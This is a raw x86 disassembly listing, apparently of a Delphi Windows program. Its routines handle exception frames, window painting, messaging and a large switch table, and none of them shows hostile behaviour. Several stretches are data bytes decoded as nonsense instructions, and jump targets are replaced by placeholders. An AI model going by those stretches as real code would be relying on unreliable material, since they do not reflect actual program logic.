push eax
mov eax [ eax ]
call [ eax + 0x14 ]
jmp r-xdata
test [ ebx + 0x26c ] 0x2
je r-xdata
or eax 0x1
test [ ebx + 0x26c ] 0x4
je r-xdata
or eax 0x2
test [ ebx + 0x26c ] 0x8
je r-xdata
or eax 0x4
test [ ebx + 0x26c ] 0x10
je r-xdata
or eax 0x8
test [ ebx + 0x26c ] 0x20
je r-xdata
or eax 0x10
test [ ebx + 0x26c ] 0x40
je r-xdata
or eax 0x20
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
jmp r-xdata
or eax 0x40
sub_43e91c
ror [ ebx - 0x40 ] 0xea
xchg ecx eax
aaa
rcl [ ecx ] cl
mov ebx 0x97600095
jpo r-xdata
retn
dec esp
add [ eax ] al
add [ eax ] al
push ebx
push esi
mov esi edx
mov eax [ eax + 0x14 ]
call sub_43db74
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax ebx
call sub_4196d8
pop esi
pop ebx
retn
sub_43e954
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov eax [ eax + 0x14 ]
call sub_43db74
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov eax ebx
call sub_4196d8
pop edi
pop esi
pop ebx
retn
sub_43e984
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_43e9e2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_419994
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_4553b8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e9e9
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_452654
sub_43e9ec
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4032ec
mov eax edi
mov edx [ eax ]
call [ edx + 0x84 ]
push eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x80 ]
mov ecx esi
mov dl 0x1
call sub_4320a8
mov [ edi + 0x14 ] eax
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_43ea48
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
lea eax [ esi + 0x14 ]
call sub_40d814
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419dc8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_43eabb
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_432070
mov eax [ eax + 0x10 ]
push eax
mov edx edi
mov eax [ ebx + 0x14 ]
call sub_432070
pop edx
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_432070
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx edi
mov eax [ ebx + 0x14 ]
call sub_432070
mov eax [ eax + 0x18 ]
mov [ ebp - 0x8 ] eax
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_432070
mov eax [ eax + 0x18 ]
push eax
mov edx edi
mov eax [ ebx + 0x14 ]
call sub_432070
pop edx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_432070
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov edx edi
mov eax [ ebx + 0x14 ]
call sub_432070
mov eax [ eax + 0x1c ]
mov [ ebp - 0x8 ] eax
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_432070
mov eax [ eax + 0x1c ]
push eax
mov edx edi
mov eax [ ebx + 0x14 ]
call sub_432070
pop edx
mov ecx [ eax ]
call [ ecx + 0x30 ]
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_432070
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
mov edx edi
mov eax [ ebx + 0x14 ]
call sub_432070
mov eax [ eax + 0x20 ]
mov [ ebp - 0x8 ] eax
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_432070
mov eax [ eax + 0x20 ]
push eax
mov edx edi
mov eax [ ebx + 0x14 ]
call sub_432070
pop edx
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_432070
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ebc8
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_43ebd0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_432070
mov edx [ eax + 0x10 ]
mov eax edi
call sub_40416c
pop edi
pop esi
pop ebx
retn
sub_43ec24
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0xffffffff
mov eax [ edi + 0x14 ]
call sub_419a38
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov [ esp ] ebx
jmp r-xdata
mov eax [ edi + 0x14 ]
mov edx ebx
call sub_432070
mov eax [ eax + 0x10 ]
mov edx ebp
call sub_408210
test eax eax
jne r-xdata
sub_43ec8c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_432070
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x14 ]
pop edi
pop esi
pop ebx
retn
sub_43ecac
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
pop edi
pop esi
pop ebx
retn
sub_43ecd4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ esi + 0x10 ]
call sub_4553b8
test al al
je r-xdata
pop esi
pop ebx
retn
push 0x0
mov eax ebx
xor al 0x1
and eax 0x7f
push eax
push 0xb
mov eax [ esi + 0x10 ]
call sub_4550b4
push eax
call SendMessageA
xor bl 0x1
test bl bl
je r-xdata
mov eax [ esi + 0x10 ]
call sub_44edf0
sub_43ed24
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4045c8
xor eax eax
push ebp
push sub_43ed8c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x20 ]
mov eax [ eax + 0x22c ]
call sub_437c64
mov ebx eax
mov ecx esi
xor edx edx
mov eax ebx
call sub_4378bc
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_437704
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_4377b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ed93
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_43ed9c
push ebx
push esi
mov esi edx
mov eax [ eax + 0x20 ]
mov eax [ eax + 0x22c ]
call sub_437c64
mov ebx eax
mov ecx [ esi + 0x18 ]
xor edx edx
mov eax ebx
call sub_4378bc
mov edx [ esi + 0x10 ]
mov eax ebx
call sub_437704
mov edx [ esi + 0x14 ]
mov eax ebx
call sub_4377b4
pop esi
pop ebx
retn
sub_43edd4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ ebx + 0x20 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4034cc
mov edx edi
mov eax esi
call sub_43b258
sub_43ee08
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4045c8
xor eax eax
push ebp
push sub_43ee68
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x20 ]
mov edx [ r-xdata ]
call sub_4034cc
push esi
push 0xffffffff
push 0xffffffff
mov edx [ ebp + 0x8 ]
push edx
mov eax [ eax + 0x28c ]
mov ecx esi
mov edx [ ebp - 0x4 ]
call sub_43db80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ee6f
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_43ee78
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ esi + 0x20 ]
mov edx [ r-xdata ]
call sub_4034cc
mov edx [ ebx + 0x18 ]
push edx
push 0xffffffff
push 0xffffffff
mov ecx [ ebx + 0x14 ]
push ecx
mov eax [ eax + 0x28c ]
mov ecx edx
mov edx [ ebx + 0x10 ]
call sub_43db80
pop esi
pop ebx
retn
sub_43eeac
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov ecx [ ebx + 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_43eef0
mov esi eax
mov eax [ ebp + 0xc ]
mov edx esi
test edx edx
je r-xdata
xor edx edx
mov [ eax ] edx
call sub_405ad0
mov eax [ ebx + 0x10 ]
mov [ esi + 0x10 ] eax
xor eax eax
pop esi
pop ebx
pop ebp
retn 0x8
sub edx 0xffffffec
sub_43eef0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4032ec
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_43ef38
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0xc ]
call sub_432070
mov edx [ eax + 0x10 ]
mov eax edi
call sub_40416c
pop edi
pop esi
pop ebx
retn
sub_43ef5c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_43f022
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax esi
call sub_43ef2c
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp ebx [ ebp + 0xc ]
jge r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ ebp - 0x8 ]
jl r-xdata
cmp ebx [ ebp + 0xc ]
jne r-xdata
mov eax [ ebp + 0x14 ]
mov [ eax ] ebx
lea ecx [ ebp - 0xc ]
mov edx [ esi + 0x10 ]
mov eax esi
call sub_43ef38
mov edx [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
call sub_404944
mov eax [ ebp - 0x4 ]
call sub_404964
mov edi eax
add edi edi
lea eax [ edi + 0x2 ]
push eax
call CoTaskMemAlloc
mov edx [ ebp + 0x10 ]
mov [ edx + ebx * 4 ] eax
lea edx [ edi + 0x2 ]
mov eax [ ebp + 0x10 ]
mov eax [ eax + ebx * 4 ]
xor ecx ecx
call sub_402d00
mov eax [ ebp + 0x10 ]
mov eax [ eax + ebx * 4 ]
mov ecx edi
mov edx [ ebp - 0x4 ]
call sub_406df8
inc ebx
inc [ esi + 0x10 ]
mov ebx 0x1
xor ebx ebx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f029
lea eax [ ebp - 0xc ]
call sub_404118
lea eax [ ebp - 0x4 ]
call sub_4047f8
retn
sub_43f048
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax ebx
call sub_43ef2c
mov edx [ ebp + 0xc ]
add [ ebx + 0x10 ] edx
cmp eax [ ebx + 0x10 ]
jle r-xdata
xor eax eax
mov [ ebx + 0x10 ] eax
mov eax 0x1
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0x8
sub_43f074
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43f0e3
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f0ea
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
mov eax rw-data
mov edx [ r-xdata ]
call sub_404b68
mov eax rw-data
mov edx [ r-xdata ]
call sub_404b68
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_43f0f4
inc eax
int1
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0xf ] cl
inc ebx
add [ eax ] dh
add [ eax ] al
mov al 0x10
inc eax
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ eax + 0x140043f3 ] cl
hlt
sub_43f33c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
call sub_42cce4
mov [ esi + 0x5 ] al
call sub_436920
cmp eax 0x60000
setge al
mov [ esi + 0x4 ] al
mov eax esi
call sub_43fb80
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_43f388
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax esi
call sub_43f428
call sub_42cb24
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40330c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_43f3bc
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp [ esi + 0x6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ esi + eax * 4 + 0x8 ]
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al bl
cmp [ esi + eax * 4 + 0x8 ] 0x0
jne r-xdata
mov edi ebx
and edi 0x7f
mov eax [ edi * 4 + rw-data ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ esi + edi * 4 + 0x8 ] eax
sub_43f428
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
inc ebx
cmp bl 0x18
jne r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
xor eax eax
mov [ esi + edi * 4 + 0x8 ] eax
mov edi ebx
and edi 0x7f
mov eax [ esi + edi * 4 + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_43f46c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_43f3bc
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_43f4b8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_43f3bc
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_43f4fc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp + 0x10 ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov al 0x1
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov dl [ ebx ]
mov eax esi
call sub_43f3bc
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
test al al
je r-xdata
sub_43f564
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov ebx eax
mov esi [ ebp + 0x14 ]
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax esi
call sub_404964
push eax
mov eax esi
call sub_404954
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push edi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_43f3bc
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_43f5c8
mov [ ecx ] 0x0
xor eax eax
mov al dl
cmp eax 0xf
jge r-xdata
add eax 0xfffffff1
sub eax 0xc
jb r-xdata
add eax 0xfffffffe
sub eax 0x5
jb r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0xf
jmp r-xdata
sub eax 0x2
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
sub eax 0x8
jb r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x4
mov eax 0x1b
jmp r-xdata
je r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x7
jmp r-xdata
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0x1d
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_43f64c
mov [ ecx ] 0x3
mov eax edx
add al 0xfe
sub al 0x7
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
je r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x2
mov eax 0x9
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_43f688
mov [ ecx ] 0x17
xor eax eax
mov al dl
cmp eax 0x68
ja r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
mov al [ eax + lookup_table_43f6a5 ]
jmp [ eax * 4 + jump_table_43f70e ]
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x5
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x8
jmp r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0xb
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0xe
jmp r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x11
jmp r-xdata
mov [ ecx + 0x4 ] 0x7
mov eax 0x14
jmp r-xdata
mov [ ecx + 0x4 ] 0x8
mov eax 0x16
jmp r-xdata
mov [ ecx + 0x4 ] 0x9
mov eax 0x18
jmp r-xdata
mov [ ecx + 0x4 ] 0xa
mov eax 0x1a
jmp r-xdata
mov [ ecx + 0x4 ] 0xb
mov eax 0x1c
jmp r-xdata
mov [ ecx + 0x4 ] 0xc
mov eax 0x1e
jmp r-xdata
mov [ ecx + 0x4 ] 0xd
mov eax 0x20
jmp r-xdata
mov [ ecx + 0x4 ] 0xe
mov eax 0x24
jmp r-xdata
mov [ ecx + 0x4 ] 0xf
mov eax 0x28
jmp r-xdata
mov [ ecx + 0x4 ] 0x10
mov eax 0x2c
jmp r-xdata
mov [ ecx + 0x4 ] 0x11
mov eax 0x30
jmp r-xdata
mov [ ecx + 0x4 ] 0x12
mov eax 0x34
jmp r-xdata
mov [ ecx + 0x4 ] 0x13
mov eax 0x38
jmp r-xdata
mov [ ecx + 0x4 ] 0x14
mov eax 0x3c
jmp r-xdata
mov [ ecx + 0x4 ] 0x15
mov eax 0x40
jmp r-xdata
mov [ ecx + 0x4 ] 0x16
mov eax 0x44
jmp r-xdata
mov [ ecx + 0x4 ] 0x17
mov eax 0x48
jmp r-xdata
mov [ ecx + 0x4 ] 0x18
mov eax 0x4c
jmp r-xdata
mov [ ecx + 0x4 ] 0x19
mov eax 0x50
jmp r-xdata
mov [ ecx + 0x4 ] 0x1a
mov eax 0x54
jmp r-xdata
mov [ ecx + 0x4 ] 0x1b
mov eax 0x58
jmp r-xdata
mov [ ecx + 0x4 ] 0x1c
mov eax 0x5c
jmp r-xdata
mov [ ecx + 0x4 ] 0x1d
mov eax 0x60
jmp r-xdata
mov [ ecx + 0x4 ] 0x1e
mov eax 0x61
jmp r-xdata
mov [ ecx + 0x4 ] 0x1f
mov eax 0x62
jmp r-xdata
mov [ ecx + 0x4 ] 0x20
mov eax 0x63
jmp r-xdata
mov [ ecx + 0x4 ] 0x21
mov eax 0x64
jmp r-xdata
mov [ ecx + 0x4 ] 0x22
mov eax 0x65
jmp r-xdata
mov [ ecx + 0x4 ] 0x23
mov eax 0x66
jmp r-xdata
mov [ ecx + 0x4 ] 0x24
mov eax 0x67
jmp r-xdata
mov [ ecx + 0x4 ] 0x25
mov eax 0x68
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_43fa14
push ebp
mov ebp esp
add esp 0xffffffbc
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
push 0xffffffec
mov eax [ ebp - 0x4 ]
call sub_4550b4
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4550b4
push eax
call GetWindowRect
mov eax [ ebp - 0x24 ]
neg eax
push eax
mov eax [ ebp - 0x28 ]
neg eax
push eax
lea eax [ ebp - 0x28 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
call sub_4550b4
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_43fb6f
push [ fs : edx ]
mov [ fs : edx ] esp
push esi
lea esi [ ebp - 0x28 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
test bl bl
je r-xdata
mov eax [ ebp - 0x1c ]
sub eax 0x2
push eax
mov eax [ ebp - 0x20 ]
sub eax 0x2
push eax
mov eax [ ebp - 0x24 ]
add eax 0x2
push eax
mov eax [ ebp - 0x28 ]
add eax 0x2
push eax
mov eax [ ebp - 0x8 ]
push eax
call ExcludeClipRect
lea ecx [ ebp - 0x34 ]
mov dl 0x2
mov eax esi
call sub_43f64c
lea eax [ ebp - 0x28 ]
push eax
push 0x0
lea ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_43f4b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4550b4
push eax
call ReleaseDC
retn
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_4550b4
push eax
call GetWindowLongA
test eax 0x100000
je r-xdata
test eax 0x200000
je r-xdata
push 0x2
call GetSystemMetrics
mov edi eax
push 0x3
call GetSystemMetrics
mov ebx eax
push 0xfffffffe
push 0xfffffffe
lea eax [ ebp - 0x18 ]
push eax
call InflateRect
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x44 ]
push eax
mov edx [ ebp - 0xc ]
sub edx ebx
mov eax [ ebp - 0x10 ]
sub eax edi
mov ecx [ ebp - 0x10 ]
call sub_41766c
push esi
lea esi [ ebp - 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push 0xf
call GetSysColorBrush
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call FillRect
sub_43fb9c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43fbd7
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43fbde
retn
mov eax [ rw-data ]
call sub_40331c
mov eax rw-data
call sub_404118
sub_43fbe8
xor al 0xfc
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
std
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
std
inc ebx
add [ edx ] bl
std
inc ebx
add [ eax ] dl
add al [ eax ]
add [ eax - 0x13ffbb53 ] dh
and [ edx ] eax
pop eax
xor eax 0x1b400040
inc edx
add [ eax + 0x35 ] ah
inc eax
add [ esp + ebp ] ch
inc ebp
add [ edx + esi + 0x32d00040 ] dh
inc eax
add al bl
insd
inc ebp
add ah cl
pop ebx
inc ebp
add ah dh
and eax [ ebp ]
hlt
sub_43ff9c
dec esp
sti
inc esp
add [ eax ] cl
or al 0x45
add [ eax - 0x3ffbb13 ] cl
in eax dx
inc esp
add [ eax - 0x22 ] dh
inc esp
add ah bl
in eax dx
inc esp
add ah al
inc eax
inc esp
add [ eax + 0x3f ] al
inc esp
add [ esi ] al
push esp
dec esp
popad
bound esp [ ebp + 0x6c ]
nop
enter 0x43ff 0x0
pop es
push es
push esp
dec esp
popad
bound esp [ ebp + 0x6c ]
sub bh bh
inc ebx
add [ esi + edi * 8 + 0x320043 ] dh
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
pop esp
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push cs
insb
jae r-xdata
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0012 ] al
outsd
outsb
jae r-xdata
outsd
push ebx
imul edi [ edx + 0x65 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
fsubr st1
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4208000f ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x7865646f
cwde
inc esp
add [ eax + ebp * 8 - 0x171bffbc ] dh
inc esp
add al cl
or [ ebp ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] al
pop es
inc ebx
popad
jo r-xdata
add bh bh
lodsb [ esi ]
inc edx
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al 0x0
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
call 0x614444c6
add [ eax ] al
dec [ eax ]
fadd [ eax + eax - 0x5c ]
fadd [ eax + eax ]
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or eax 0x6e410700
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ eax + 0x5b004491 ] ch
add [ eax ] al
dec eax
fld [ eax + eax + 0x1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
sub al 0x5c
inc ecx
add [ ecx + eax ] ch
[ edx + eax * 2 + 0x10044 ]
add [ eax ] dl
add dh bh
add [ fs : eax ] al
jb r-xdata
add bh bh
fwait
imul ebp [ edi + 0x6e ] r-xdata
jo r-xdata
add [ eax - 0x16 ] dh
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
